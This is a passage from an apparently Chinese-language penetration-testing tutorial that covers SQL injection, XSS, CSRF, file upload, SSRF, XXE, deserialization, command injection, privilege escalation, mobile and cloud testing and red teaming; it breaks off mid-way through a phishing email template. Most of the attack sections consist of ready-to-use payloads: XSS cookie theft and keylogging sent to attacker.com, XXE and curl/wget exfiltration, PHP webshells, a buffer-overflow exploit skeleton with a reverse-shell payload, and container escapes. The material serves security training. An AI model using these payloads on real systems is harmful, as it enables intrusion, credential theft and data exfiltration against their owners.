sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables  # 列出表
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --columns  # 列出列
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump  # 导出数据

# 高级选项
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3  # 更全面的测试
sqlmap -u "http://target.com/page.php?id=1" --os-shell  # 获取系统 shell
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"  # 读取文件

# 绕过 WAF
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page.php?id=1" --random-agent
```

### 6.3 XSS 跨站脚本攻击

XSS（Cross-Site Scripting）允许攻击者在受害者浏览器中执行恶意脚本。

#### 6.3.1 XSS 类型

```
┌─────────────────────────────────────────────────────────────────┐
│                      XSS 类型对比                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   反射型 XSS (Reflected XSS)                                    │
│   ├── 恶意代码在 URL 中                                         │
│   ├── 需要诱导用户点击链接                                      │
│   └── 一次性攻击                                                │
│                                                                 │
│   存储型 XSS (Stored XSS)                                       │
│   ├── 恶意代码存储在服务器                                      │
│   ├── 所有访问者都会受影响                                      │
│   └── 危害最大                                                  │
│                                                                 │
│   DOM 型 XSS (DOM-based XSS)                                    │
│   ├── 恶意代码在客户端执行                                      │
│   ├── 不经过服务器                                              │
│   └── 难以检测                                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### 6.3.2 XSS Payload 大全

```html
<!-- 基础 Payload -->
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>

<!-- 事件处理器 -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<video><source onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>

<!-- 绕过过滤 -->
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert`XSS`</script>
<script>alert(/XSS/)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">

<!-- 无引号 -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

<!-- 编码绕过 -->
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>  <!-- Base64 -->
<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>  <!-- Unicode -->

<!-- Cookie 窃取 -->
<script>
fetch('http://attacker.com/steal?c='+document.cookie)
</script>

<script>
new Image().src='http://attacker.com/steal?c='+document.cookie
</script>

<!-- 键盘记录 -->
<script>
document.onkeypress=function(e){
    fetch('http://attacker.com/log?k='+e.key)
}
</script>

<!-- 钓鱼攻击 -->
<script>
document.body.innerHTML='<form action="http://attacker.com/phish" method="POST">'+
'<input name="user" placeholder="Username">'+
'<input name="pass" type="password" placeholder="Password">'+
'<button>Login</button></form>'
</script>
```

### 6.4 CSRF 跨站请求伪造

CSRF（Cross-Site Request Forgery）利用用户已认证的会话，在用户不知情的情况下执行恶意操作。

#### 6.4.1 CSRF 攻击原理

```
┌─────────────────────────────────────────────────────────────────┐
│                    CSRF 攻击流程                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. 用户登录目标网站，获得认证 Cookie                          │
│                                                                 │
│   2. 用户访问恶意网站（未退出目标网站）                         │
│                                                                 │
│   3. 恶意网站包含自动提交的表单                                 │
│      ┌─────────────────────────────────────────────────────┐    │
│      │ <form action="http://bank.com/transfer" method="POST">│   │
│      │   <input name="to" value="attacker">                 │    │
│      │   <input name="amount" value="10000">                │    │
│      │ </form>                                              │    │
│      │ <script>document.forms[0].submit()</script>          │    │
│      └─────────────────────────────────────────────────────┘    │
│                                                                 │
│   4. 浏览器自动携带 Cookie 发送请求                             │
│                                                                 │
│   5. 目标网站认为是合法请求，执行转账                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### 6.4.2 CSRF 攻击示例

```html
<!-- GET 请求 CSRF -->
<img src="http://bank.com/transfer?to=attacker&amount=10000">

<!-- POST 请求 CSRF -->
<html>
<body onload="document.forms[0].submit()">
<form action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
</body>
</html>

<!-- JSON 请求 CSRF -->
<html>
<body>
<script>
fetch('http://api.target.com/user/update', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
</body>
</html>

<!-- 使用 XMLHttpRequest -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/api/change-password', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('new_password=hacked123');
</script>
```

### 6.5 文件上传漏洞

文件上传漏洞允许攻击者上传恶意文件（如 WebShell）到服务器，从而获取服务器控制权。

#### 6.5.1 绑过文件上传限制

```php
<?php
// 简单的 PHP WebShell
system($_GET['cmd']);
?>

<?php
// 更隐蔽的 WebShell
@eval($_POST['pass']);
?>

<?php
// 一句话木马
@eval(base64_decode($_POST['cmd']));
?>
```

```bash
# 绕过技术

# 1. 修改文件扩展名
shell.php -> shell.php.jpg
shell.php -> shell.pHp
shell.php -> shell.php5
shell.php -> shell.phtml

# 2. 双扩展名
shell.jpg.php
shell.php.jpg (Apache 配置不当时)

# 3. 空字节截断 (PHP < 5.3.4)
shell.php%00.jpg
shell.php\x00.jpg

# 4. 修改 Content-Type
Content-Type: image/jpeg

# 5. 添加图片文件头
GIF89a<?php system($_GET['cmd']); ?>

# 6. 使用 .htaccess
# 上传 .htaccess 文件
AddType application/x-httpd-php .jpg

# 7. 大小写绑过
shell.PhP
shell.pHP

# 8. 特殊字符
shell.php::$DATA (Windows)
shell.php.
shell.php (空格)
```

#### 6.5.2 图片马制作

```bash
# 方法 1：在图片末尾追加 PHP 代码
cat image.jpg shell.php > image_shell.jpg

# 方法 2：使用 exiftool 修改元数据
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# 方法 3：使用 GIF 文件头
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
```

---

## 7. Web安全进阶

### 7.1 SSRF 服务端请求伪造

SSRF（Server-Side Request Forgery）允许攻击者让服务器发起请求，可用于访问内网资源、云元数据等。

#### 7.1.1 SSRF 攻击场景

```
┌─────────────────────────────────────────────────────────────────┐
│                    SSRF 攻击场景                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   攻击者                Web 服务器              内网服务         │
│     │                      │                      │             │
│     │  1. 发送恶意请求     │                      │             │
│     │ ──────────────────► │                      │             │
│     │  url=http://内网IP   │                      │             │
│     │                      │                      │             │
│     │                      │  2. 服务器发起请求   │             │
│     │                      │ ──────────────────► │             │
│     │                      │                      │             │
│     │                      │  3. 返回内网数据     │             │
│     │                      │ ◄────────────────── │             │
│     │                      │                      │             │
│     │  4. 返回结果给攻击者 │                      │             │
│     │ ◄────────────────── │                      │             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### 7.1.2 SSRF Payload

```bash
# 访问内网服务
http://127.0.0.1:80
http://localhost:22
http://192.168.1.1
http://10.0.0.1

# 访问云元数据（AWS）
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 访问云元数据（GCP）
http://metadata.google.internal/computeMetadata/v1/

# 访问云元数据（Azure）
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# 使用不同协议
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a

# 绕过过滤
http://127.0.0.1 -> http://127.1
http://127.0.0.1 -> http://0.0.0.0
http://127.0.0.1 -> http://0
http://127.0.0.1 -> http://[::1]
http://127.0.0.1 -> http://127.0.0.1.nip.io
http://127.0.0.1 -> http://2130706433 (十进制)
http://127.0.0.1 -> http://0x7f000001 (十六进制)

# DNS 重绑定
# 使用特殊域名，第一次解析到合法 IP，第二次解析到内网 IP
```

### 7.2 XXE XML 外部实体注入

XXE（XML External Entity）漏洞允许攻击者通过 XML 解析器读取文件、执行 SSRF 等。

#### 7.2.1 XXE Payload

```xml
<!-- 读取文件 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/secret">
]>
<root>&xxe;</root>

<!-- 带外数据外带 (OOB) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>

<!-- evil.dtd 内容 -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;

<!-- 盲 XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>

<!-- PHP 伪协议 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

### 7.3 反序列化漏洞

反序列化漏洞发生在应用程序反序列化不可信数据时，可能导致远程代码执行。

#### 7.3.1 PHP 反序列化

```php
<?php
// 漏洞代码示例
class User {
    public $username;
    public $isAdmin = false;
    
    public function __wakeup() {
        // 反序列化时自动调用
        if ($this->isAdmin) {
            // 执行管理员操作
        }
    }
}

// 攻击者构造的序列化数据
$payload = 'O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}';
$user = unserialize($payload);
// $user->isAdmin 现在是 true

// 更危险的利用 - 命令执行
class Evil {
    public $cmd;
    
    public function __destruct() {
        system($this->cmd);
    }
}

$payload = 'O:4:"Evil":1:{s:3:"cmd";s:2:"id";}';
?>
```

#### 7.3.2 Java 反序列化

```bash
# 使用 ysoserial 生成 Payload
java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin

# 常见的 Gadget Chain
CommonsCollections1-7
Spring1-2
Hibernate1-2
JRMPClient
JRMPListener

# 检测反序列化漏洞
# 查找 ObjectInputStream.readObject()
# 查找 XMLDecoder
# 查找 Yaml.load()
# 查找 JSON 反序列化库
```

### 7.4 命令注入

命令注入允许攻击者在服务器上执行任意系统命令。

```bash
# 命令注入 Payload

# 命令分隔符
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)

# 换行符
%0a ls
%0d ls

# 绕过空格过滤
cat</etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd

# 绕过关键字过滤
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd

# 编码绕过
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# 时间盲注
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)

# 带外数据
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(cat /etc/passwd | base64)
```

---

## 8. 渗透测试方法论

### 8.1 渗透测试流程

```
┌─────────────────────────────────────────────────────────────────┐
│                    渗透测试标准流程                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   阶段 1：前期交互 (Pre-engagement)                             │
│   ├── 确定测试范围                                              │
│   ├── 签署授权协议                                              │
│   ├── 明确测试规则                                              │
│   └── 建立沟通渠道                                              │
│                                                                 │
│   阶段 2：信息收集 (Reconnaissance)                             │
│   ├── 被动信息收集                                              │
│   │   ├── WHOIS 查询                                           │
│   │   ├── DNS 枚举                                             │
│   │   ├── 搜索引擎                                             │
│   │   └── 社交媒体                                             │
│   └── 主动信息收集                                              │
│       ├── 端口扫描                                             │
│       ├── 服务识别                                             │
│       └── 目录枚举                                             │
│                                                                 │
│   阶段 3：漏洞分析 (Vulnerability Analysis)                     │
│   ├── 自动化扫描                                                │
│   ├── 手动测试                                                  │
│   └── 漏洞验证                                                  │
│                                                                 │
│   阶段 4：漏洞利用 (Exploitation)                               │
│   ├── 选择攻击向量                                              │
│   ├── 执行漏洞利用                                              │
│   └── 获取初始访问                                              │
│                                                                 │
│   阶段 5：后渗透 (Post-Exploitation)                            │
│   ├── 权限提升                                                  │
│   ├── 横向移动                                                  │
│   ├── 数据收集                                                  │
│   └── 持久化                                                    │
│                                                                 │
│   阶段 6：报告 (Reporting)                                      │
│   ├── 漏洞详情                                                  │
│   ├── 风险评估                                                  │
│   ├── 修复建议                                                  │
│   └── 执行摘要                                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2 信息收集技术

#### 8.2.1 被动信息收集

```bash
# WHOIS 查询
whois example.com
whois 1.2.3.4

# DNS 枚举
dig example.com ANY
dig example.com MX
dig example.com NS
dig example.com TXT
host -t ns example.com
dnsrecon -d example.com

# 子域名枚举
# 使用 Sublist3r
sublist3r -d example.com

# 使用 Amass
amass enum -d example.com

# 使用 subfinder
subfinder -d example.com

# 搜索引擎 Dork
site:example.com
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"
site:example.com ext:sql | ext:db | ext:log

# Shodan 搜索
shodan search "hostname:example.com"
shodan search "org:Example Inc"

# 证书透明度日志
# https://crt.sh/?q=%.example.com

# Wayback Machine
# https://web.archive.org/web/*/example.com/*
```

#### 8.2.2 主动信息收集

```bash
# 端口扫描
nmap -sS -sV -O -A 192.168.1.100           # 全面扫描
nmap -sS -p- --min-rate=1000 192.168.1.100 # 快速全端口扫描
nmap -sU -p 53,67,68,69,123,161 192.168.1.100  # UDP 扫描
nmap --script vuln 192.168.1.100           # 漏洞扫描

# 目录枚举
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
dirb http://target.com /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Web 指纹识别
whatweb http://target.com
wappalyzer (浏览器插件)
nikto -h http://target.com

# CMS 识别
wpscan --url http://target.com  # WordPress
joomscan -u http://target.com   # Joomla
droopescan scan drupal -u http://target.com  # Drupal
```

### 8.3 漏洞扫描

```bash
# Nessus（商业）
# 通过 Web 界面操作

# OpenVAS（开源）
sudo gvm-start
# 访问 https://localhost:9392

# Nikto（Web 漏洞扫描）
nikto -h http://target.com
nikto -h http://target.com -Tuning x  # 排除某些测试

# Nuclei（模板化漏洞扫描）
nuclei -u http://target.com
nuclei -u http://target.com -t cves/
nuclei -l urls.txt -t nuclei-templates/

# WPScan（WordPress 专用）
wpscan --url http://target.com --enumerate u,p,t
wpscan --url http://target.com --api-token YOUR_TOKEN

# SQLMap（SQL 注入）
sqlmap -u "http://target.com/page.php?id=1" --batch

# XSStrike（XSS 扫描）
python xsstrike.py -u "http://target.com/search?q=test"
```

---

## 9. 漏洞挖掘与利用

### 9.1 漏洞挖掘方法

#### 9.1.1 代码审计

代码审计是发现漏洞最有效的方法之一，通过分析源代码来发现安全问题。

```python
# 代码审计关注点

# 1. 用户输入点
# - GET/POST 参数
# - Cookie
# - HTTP 头
# - 文件上传
# - WebSocket

# 2. 危险函数（PHP）
危险函数列表 = {
    '命令执行': ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open'],
    '代码执行': ['eval', 'assert', 'preg_replace(/e)', 'create_function'],
    '文件操作': ['include', 'require', 'include_once', 'require_once', 'file_get_contents', 'fopen'],
    'SQL 查询': ['mysql_query', 'mysqli_query', 'pg_query'],
    '反序列化': ['unserialize', 'json_decode'],
}

# 3. 危险函数（Python）
危险函数列表 = {
    '命令执行': ['os.system', 'os.popen', 'subprocess.call', 'subprocess.Popen'],
    '代码执行': ['eval', 'exec', 'compile'],
    '反序列化': ['pickle.loads', 'yaml.load'],
}

# 4. 危险函数（Java）
危险函数列表 = {
    '命令执行': ['Runtime.exec', 'ProcessBuilder'],
    '反序列化': ['ObjectInputStream.readObject', 'XMLDecoder'],
    'SQL 查询': ['Statement.execute', 'PreparedStatement (拼接时)'],
}
```

#### 9.1.2 模糊测试（Fuzzing）

```bash
# 使用 ffuf 进行 Web Fuzzing
# 目录 Fuzzing
ffuf -u http://target.com/FUZZ -w wordlist.txt

# 参数 Fuzzing
ffuf -u http://target.com/page.php?FUZZ=test -w params.txt

# 值 Fuzzing
ffuf -u http://target.com/page.php?id=FUZZ -w values.txt

# POST 数据 Fuzzing
ffuf -u http://target.com/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt

# 使用 wfuzz
wfuzz -c -z file,wordlist.txt http://target.com/FUZZ
wfuzz -c -z file,wordlist.txt -d "user=admin&pass=FUZZ" http://target.com/login

# 使用 Burp Suite Intruder
# 1. 捕获请求
# 2. 发送到 Intruder
# 3. 标记 Fuzzing 位置
# 4. 选择 Payload
# 5. 开始攻击
```

### 9.2 漏洞利用开发

#### 9.2.1 缓冲区溢出基础

```python
#!/usr/bin/env python3
"""
缓冲区溢出利用开发示例
"""

import socket
import struct

# 目标信息
target_ip = "192.168.1.100"
target_port = 9999

# 1. 确定崩溃点
def find_crash():
    buffer = "A" * 3000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(buffer.encode())
    s.close()

# 2. 确定 EIP 偏移量
# 使用 pattern_create 生成唯一模式
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

def find_offset():
    # 使用 Metasploit 生成的模式
    pattern = "Aa0Aa1Aa2..."  # 省略
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(pattern.encode())
    s.close()
    # 使用 pattern_offset 找到偏移量
    # /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP值>

# 3. 确定坏字符
def find_bad_chars():
    badchars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
        "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
        # ... 继续到 \xff
    )
    offset = 2003  # 假设偏移量
    buffer = "A" * offset + "BBBB" + badchars
    # 发送并在调试器中检查哪些字符被过滤

# 4. 找到 JMP ESP 地址
# 使用 mona.py 在调试器中查找
# !mona jmp -r esp -cpb "\x00"

# 5. 生成 Shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -b "\x00" -f python

# 6. 完整利用代码
def exploit():
    offset = 2003
    eip = struct.pack("<I", 0x625011af)  # JMP ESP 地址
    nops = "\x90" * 16
    
    # Shellcode (msfvenom 生成)
    shellcode = (
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        # ... 省略
    )
    
    buffer = "A" * offset + eip + nops + shellcode
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(buffer.encode())
    s.close()

if __name__ == "__main__":
    exploit()
```

### 9.3 权限提升技术

#### 9.3.1 Linux 提权

```bash
# 信息收集
uname -a                    # 内核版本
cat /etc/issue              # 发行版信息
cat /etc/*-release          # 发行版详情
id                          # 当前用户
sudo -l                     # sudo 权限

# SUID 提权
find / -perm -4000 -type f 2>/dev/null
# 常见可利用的 SUID 程序
# /usr/bin/find
find . -exec /bin/sh \; -quit
# /usr/bin/vim
vim -c ':!/bin/sh'
# /usr/bin/nmap (旧版本)
nmap --interactive
!sh
# /usr/bin/python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Sudo 提权
# 检查 sudo 配置
sudo -l
# 如果可以运行某些程序
sudo vim -c ':!/bin/sh'
sudo find /etc -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'

# 内核漏洞提权
# Dirty COW (CVE-2016-5195)
# PwnKit (CVE-2021-4034)
# Sudo Baron Samedit (CVE-2021-3156)

# 使用 LinPEAS 自动化枚举
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 使用 Linux Exploit Suggester
./linux-exploit-suggester.sh
```

#### 9.3.2 Windows 提权

```powershell
# 信息收集
systeminfo                  # 系统信息
whoami /all                 # 用户权限
net user                    # 用户列表
net localgroup administrators  # 管理员组

# 服务提权
# 查找可写服务
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
# 修改服务路径
sc config servicename binpath= "C:\temp\shell.exe"
sc start servicename

# 计划任务提权
schtasks /query /fo LIST /v
# 查找可写的计划任务脚本

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 如果都为 1，可以使用 msi 提权
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=y -f msi > shell.msi
msiexec /quiet /qn /i shell.msi

# 使用 WinPEAS 自动化枚举
.\winPEASx64.exe

# 使用 PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# 使用 Windows Exploit Suggester
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
```

---

## 10. 逆向工程基础

### 10.1 逆向工程概述

逆向工程是分析软件内部工作原理的技术，对于漏洞研究、恶意软件分析和安全研究至关重要。

```
┌─────────────────────────────────────────────────────────────────┐
│                    逆向工程工具链                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   静态分析工具                                                  │
│   ├── IDA Pro - 业界标准反汇编器                               │
│   ├── Ghidra - NSA 开源逆向工具                                │
│   ├── Binary Ninja - 现代化逆向平台                            │
│   ├── Radare2 - 开源命令行工具                                 │
│   └── Hopper - macOS 逆向工具                                  │
│                                                                 │
│   动态分析工具                                                  │
│   ├── x64dbg/x32dbg - Windows 调试器                           │
│   ├── OllyDbg - 经典 Windows 调试器                            │
│   ├── GDB - Linux 调试器                                       │
│   ├── WinDbg - Windows 内核调试器                              │
│   └── Frida - 动态插桩框架                                     │
│                                                                 │
│   辅助工具                                                      │
│   ├── PE-bear - PE 文件分析                                    │
│   ├── CFF Explorer - PE 编辑器                                 │
│   ├── Detect It Easy - 文件识别                                │
│   └── strings - 字符串提取                                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 10.2 汇编语言基础

```nasm
; x86 汇编基础

; 寄存器
; EAX, EBX, ECX, EDX - 通用寄存器
; ESP - 栈指针
; EBP - 基址指针
; EIP - 指令指针
; ESI, EDI - 源/目标索引

; 常见指令
mov eax, ebx        ; 将 ebx 的值复制到 eax
push eax            ; 将 eax 压入栈
pop eax             ; 从栈弹出到 eax
add eax, 10         ; eax = eax + 10
sub eax, 5          ; eax = eax - 5
xor eax, eax        ; eax = 0 (清零)
cmp eax, ebx        ; 比较 eax 和 ebx
jmp label           ; 无条件跳转
je label            ; 相等则跳转
jne label           ; 不相等则跳转
call function       ; 调用函数
ret                 ; 返回

; 函数调用约定 (cdecl)
; 参数从右到左压栈
; 调用者清理栈
push arg2
push arg1
call function
add esp, 8          ; 清理栈

; 函数序言
push ebp            ; 保存旧的基址指针
mov ebp, esp        ; 设置新的基址指针
sub esp, 0x20       ; 分配局部变量空间

; 函数尾声
mov esp, ebp        ; 恢复栈指针
pop ebp             ; 恢复基址指针
ret                 ; 返回
```

### 10.3 使用 GDB 调试

```bash
# 基本命令
gdb ./program               # 启动调试
gdb -q ./program            # 安静模式

# 运行控制
run                         # 运行程序
run arg1 arg2               # 带参数运行
continue (c)                # 继续执行
next (n)                    # 单步执行（不进入函数）
step (s)                    # 单步执行（进入函数）
finish                      # 执行到函数返回

# 断点
break main                  # 在 main 函数设置断点
break *0x08048000           # 在地址设置断点
break file.c:10             # 在源文件行号设置断点
info breakpoints            # 查看断点
delete 1                    # 删除断点 1
disable 1                   # 禁用断点 1

# 查看信息
info registers              # 查看寄存器
info frame                  # 查看栈帧
info functions              # 查看函数
disassemble main            # 反汇编 main 函数
x/10x $esp                  # 查看栈内容（16进制）
x/10i $eip                  # 查看指令
x/s 0x08048000              # 查看字符串
print $eax                  # 打印寄存器值
print variable              # 打印变量值

# 修改
set $eax = 0                # 修改寄存器
set {int}0x08048000 = 100   # 修改内存

# GDB 增强
# 使用 pwndbg 或 GEF
# pip install pwndbg
# 或
# pip install gef
```

---

## 11. 移动安全

### 11.1 Android 安全

#### 11.1.1 Android 应用分析

```bash
# APK 分析工具
# 解压 APK
unzip app.apk -d app_extracted

# 使用 apktool 反编译
apktool d app.apk -o app_decompiled

# 使用 jadx 反编译为 Java
jadx app.apk -d app_java

# 使用 dex2jar 转换
d2j-dex2jar app.apk
# 然后使用 JD-GUI 查看

# 签名信息
keytool -printcert -jarfile app.apk
jarsigner -verify -verbose app.apk

# 权限分析
aapt dump permissions app.apk
```

#### 11.1.2 Android 渗透测试

```bash
# ADB 命令
adb devices                 # 列出设备
adb shell                   # 进入 shell
adb install app.apk         # 安装应用
adb pull /path/file         # 下载文件
adb push file /path         # 上传文件
adb logcat                  # 查看日志

# 使用 Frida 进行动态分析
# 安装 Frida
pip install frida-tools

# 启动 Frida 服务（需要 root）
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# Frida 脚本示例 - 绑过 SSL Pinning
frida -U -f com.example.app -l ssl_bypass.js

# ssl_bypass.js 内容
Java.perform(function() {
    var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    // 实现空的 TrustManager
    var TrustManagerImpl = Java.registerClass({
        name: 'com.example.TrustManager',
        implements: [TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    // 替换 SSLContext
    var TrustManagers = [TrustManagerImpl.$new()];
    var sslContext = SSLContext.getInstance("TLS");
    sslContext.init(null, TrustManagers, null);
});
```

### 11.2 iOS 安全

```bash
# iOS 应用分析
# 需要越狱设备

# 使用 Clutch 解密 IPA
Clutch -d com.example.app

# 使用 class-dump 提取头文件
class-dump -H app.decrypted -o headers/

# 使用 Hopper 或 IDA 分析二进制

# Frida iOS
frida -U -f com.example.app -l script.js

# Objection - 移动安全测试框架
pip install objection
objection -g com.example.app explore

# Objection 常用命令
ios hooking list classes
ios hooking watch method "-[ClassName methodName]"
ios keychain dump
ios nsuserdefaults get
```

---

## 12. 云安全与容器安全

### 12.1 云安全基础

```bash
# AWS 安全测试

# 枚举 S3 存储桶
aws s3 ls s3://bucket-name --no-sign-request
# 使用工具
python3 s3scanner.py -l buckets.txt

# 枚举 IAM
aws iam list-users
aws iam list-roles
aws iam get-user
aws iam list-attached-user-policies --user-name username

# 获取元数据（SSRF 利用）
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 使用 Pacu（AWS 渗透测试框架）
python3 pacu.py
# 在 Pacu 中
run iam__enum_users_roles_policies_groups
run ec2__enum
run s3__bucket_finder

# Azure 安全测试
# 使用 Azure CLI
az login
az account list
az vm list
az storage account list

# 使用 MicroBurst
Import-Module .\MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base company

# GCP 安全测试
gcloud auth list
gcloud projects list
gcloud compute instances list
```

### 12.2 容器安全

```bash
# Docker 安全

# 检查 Docker 配置
docker info
docker version

# 容器逃逸检测
# 检查是否在容器中
cat /proc/1/cgroup
ls -la /.dockerenv

# 特权容器逃逸
# 如果容器以 --privileged 运行
mount /dev/sda1 /mnt
chroot /mnt

# 利用 Docker Socket
# 如果 /var/run/docker.sock 可访问
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host

# Kubernetes 安全
# 检查权限
kubectl auth can-i --list
kubectl auth can-i create pods

# 枚举
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get configmaps --all-namespaces

# 获取 Secret
kubectl get secret secret-name -o jsonpath='{.data}'

# 使用 kube-hunter
kube-hunter --remote target-ip

# 使用 kubeaudit
kubeaudit all
```

---

## 13. 红队技术

### 13.1 红队概述

红队（Red Team）是模拟真实攻击者的专业团队，通过全面的攻击模拟来测试组织的安全防御能力。与传统渗透测试不同，红队行动更加全面，包括社会工程、物理安全等多个维度。

```
┌─────────────────────────────────────────────────────────────────┐
│                    红队 vs 渗透测试                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   渗透测试                          红队行动                    │
│   ├── 范围明确                      ├── 范围广泛                │
│   ├── 时间有限（1-2周）             ├── 时间较长（数周到数月）  │
│   ├── 发现尽可能多的漏洞            ├── 模拟真实攻击场景        │
│   ├── 通常不包含社会工程            ├── 包含社会工程            │
│   ├── 蓝队知情                      ├── 蓝队不知情              │
│   └── 报告漏洞列表                  └── 测试整体防御能力        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 13.2 社会工程学

社会工程学是利用人性弱点来获取信息或访问权限的技术，是红队行动中非常重要的一环。

#### 13.2.1 钓鱼攻击

```bash
# 使用 Gophish 进行钓鱼演练
# 安装 Gophish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
./gophish

# 访问管理界面 https://localhost:3333

# 钓鱼邮件模板示例
Subject: 紧急：您的账户需要验证

尊敬的用户，

